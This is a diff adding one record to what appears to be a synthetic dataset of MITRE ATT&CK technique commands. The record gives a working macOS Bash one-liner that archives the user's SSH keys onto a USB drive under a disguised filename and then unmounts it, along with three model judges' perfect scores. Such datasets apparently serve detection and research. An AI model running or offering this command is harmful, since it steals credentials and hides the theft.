@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "tar -czf - \"$HOME/.ssh\" 2>/dev/null | dd of=\"/Volumes/USB/._README\" bs=1m conv=sync,noerror && sync && diskutil unmount \"/Volumes/USB\"",
+  "explanation": "Streams compressed SSH keys and configs into an AppleDouble-style sidecar file on the removable drive using dd, then unmounts the volume for physical exfiltration.",
+  "rationale_steps": [
+    "Package SSH credentials and configs into a single archive stream.",
+    "Target an AppleDouble filename to reduce casual visibility.",
+    "Write directly to the USB with dd to ensure local-only transfer.",
+    "Sync and unmount to complete the physical exfiltration process."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-24937b47-a619e1e8",
+  "source_prompt_hash": "24937b47",
+  "timestamp_utc": "2025-09-30T05:19:16.168507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed with balanced quotes, valid piping and redirection, and legitimate options for tar, dd (bs=1m, conv=sync,noerror), sync, and diskutil on macOS.",
+        "semantic_score": 5,
+        "semantic_justification": "Compresses ~/.ssh to a stream, writes it to a stealthy AppleDouble-style filename on a mounted USB volume, then syncs and unmounts, aligning with exfiltration over a physical medium.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T09:30:25.866179Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators (|, &&), valid flags for tar, dd, and diskutil, and correct syntax for redirecting stderr.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by compressing SSH credentials (valuable authentication material), writing them to a hidden-looking file on a USB drive, and then unmounting the drive for physical exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T09:30:29.144027Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid command separators, correct flag formats, and no impossible constructs.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves its claimed intent by compressing sensitive files, streaming them to a removable medium using an obfuscated filename, ensuring data integrity, and then unmounting the volume, directly aligning with the T1052 Exfiltration Over Physical Medium technique.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T09:30:41.022004Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
